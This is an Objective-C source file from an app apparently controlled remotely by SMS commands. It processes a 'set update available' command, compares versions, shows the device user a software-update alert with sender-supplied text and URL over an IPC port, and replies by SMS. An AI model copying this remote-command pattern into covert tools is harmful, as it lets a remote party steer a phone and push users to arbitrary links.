//
//  SetUpdateAvailableProcessor.m
//  RCM
//
//  Created by Makara Khloth on 10/2/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SetUpdateAvailableProcessor.h"
#import "PrefDeviceLock.h"
#import "PrefPanic.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"

#import "SBSLocalNotificationClient.h"

#import <UIKit/UILocalNotification.h>

@interface SetUpdateAvailableProcessor (private)
- (void) processUpdateAvailable;
- (void) setUpdateAvailableException;
- (NSArray *) parseVersion: (NSString *) aVersion;
- (void) sendReplySMS: (NSString *) aMessage success: (BOOL) aSuccess;
@end

@implementation SetUpdateAvailableProcessor

/**
 - Method name:			initWithRemoteCommandData
 - Purpose:				This method is used to initialize the SetUpdateAvailableProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description:	self(SetUpdateAvailableProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetUpdateAvailableProcessor ---> initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the SetUpdateAvailableProcessor
 - Argument list and description: 
 - Return description:	No return type
 */

- (void) doProcessingCommand {
	DLog (@"SetUpdateAvailableProcessor ---> doProcessingCommand");
	[self processUpdateAvailable];
}


#pragma mark SetUpdateAvailableProcessor PrivateAPI Methods

/**
 - Method name:			processUpdateAvailable
 - Purpose:				This method is used to enable url profile
 - Argument list and description: No Argument
 - Return description:	No return type
 */
- (void) processUpdateAvailable {
	DLog (@"SetUpdateAvailableProcessor ---> processUpdateAvailable");

	if ([[mRemoteCmdData mArguments] count] < 3) {
		[self setUpdateAvailableException];
	} else {	
		id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
		id <AppContext> applicationContext = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
		NSString *applicationVersion = [[applicationContext getProductInfo] getProductVersion]; // "[-]Major.Minor"
		NSString *newVersion = [[mRemoteCmdData mArguments] objectAtIndex:2]; // "[-]Major.Minor"
		NSArray *applicationVersionComponents = [self parseVersion:applicationVersion];
		NSArray *newVersionComponents = [self parseVersion:newVersion];
		
		BOOL majorUpdate = NO;
		BOOL minorUpdate = NO;
		if ([[newVersionComponents objectAtIndex:0] intValue] > [[applicationVersionComponents objectAtIndex:0] intValue]) {
			majorUpdate = YES;
		}
		if ([[newVersionComponents objectAtIndex:1] intValue] > [[applicationVersionComponents objectAtIndex:1] intValue]) {
			minorUpdate = YES;
		}
		
		PrefDeviceLock *prefDeviceLock = (PrefDeviceLock *)[prefManager preference:kAlert];
		PrefPanic *prefPanic = (PrefPanic *)[prefManager preference:kPanic];
		
		if ([prefPanic mPanicStart] || [prefDeviceLock mStartAlertLock]) {
			[self sendReplySMS:NSLocalizedString(@"kSetUpdateAvailableErrorMSG2", @"") success:NO];
		} else {
			if (majorUpdate || minorUpdate) {
				NSString *text = @"";
				NSString *url = @"";
				// Note: No need to check "D" at the end
				if ([[mRemoteCmdData mArguments] count] > 3) {			
					text = [[mRemoteCmdData mArguments] objectAtIndex:3];
					
					if ([[mRemoteCmdData mArguments] count] > 4) {		
						url = [[mRemoteCmdData mArguments] objectAtIndex:4];
					}
				}
				
				NSDictionary *userInfo = [NSDictionary dictionaryWithObjectsAndKeys:
										  @"SoftwareUpdate", @"alertType",
										  text, @"message", 
										  url, @"url", 
										  nil];
				NSMutableData *userInfoData = [NSMutableData data];
				NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:userInfoData];
				[archiver encodeObject:userInfo forKey:@"userInfo"];
				[archiver finishEncoding];
				MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kFSBSUIAlertMessagePort];
				[messagePortSender writeDataToPort:userInfoData];
				[messagePortSender release];
				[archiver release];
				
				[self sendReplySMS:NSLocalizedString(@"kSetUpdateAvailableOkMSG", @"") success:YES];
			} else {
				[self sendReplySMS:NSLocalizedString(@"kSetUpdateAvailableErrorMSG1", @"") success:NO];
			}
		}
	}
}

/**
 - Method name: setUpdateAvailableException
 - Purpose:This method is invoked when activation failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) setUpdateAvailableException  {
	DLog (@"SetUpdateAvailableProcessor---->setUpdateAvailableException")
	FxException* exception = [FxException exceptionWithName:@"setUpdateAvailableException" andReason:@"Argument is not enough"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			parseVersion:
 - Purpose:				This method is used to parse version [-]major.minor to array of two elements major without sign and minor
 - Argument list and description: Version string
 - Return description:	Array of major and minor
 */
- (NSArray *) parseVersion: (NSString *) aVersion {
	NSArray *versionComponents = [aVersion componentsSeparatedByString:@"."];
	NSString *majorString = [versionComponents objectAtIndex:0];
	NSString *minorString = [versionComponents objectAtIndex:1];
	
	NSNumberFormatter *numberFormat = [[[NSNumberFormatter alloc] init] autorelease];
	NSNumber *majorNumber = [numberFormat numberFromString:majorString];
	if ([majorNumber intValue] < 0) { // Testing build
		majorNumber = [NSNumber numberWithInt:abs([majorNumber intValue])];
	}
	
	NSNumber *minorNumber = [numberFormat numberFromString:minorString];
	
	versionComponents = [NSArray arrayWithObjects:majorNumber, minorNumber, nil];
	return (versionComponents);
}

/**
 - Method name:			sendReplySMS:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description: aMessage message to send
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aMessage success: (BOOL) aSuccess {
	DLog (@"SetUpdateAvailableProcessor ---> sendReplySMS:success:")
	NSString *messageFormat = nil;
	if (aSuccess) {
		messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																					andErrorCode:_SUCCESS_];
	} else {
		messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																					andErrorCode:_ERROR_];
	}
		
	NSString *updateAvailableMessage = [messageFormat stringByAppendingString:aMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:updateAvailableMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:updateAvailableMessage];
	}
}

/**
 - Method name:			dealloc
 - Purpose:				This method is used to Handle Memory managment
 - Argument list and description:	No Argument
 - Return description:	No Return Type
 */
- (void) dealloc {
	[super dealloc];
}

@end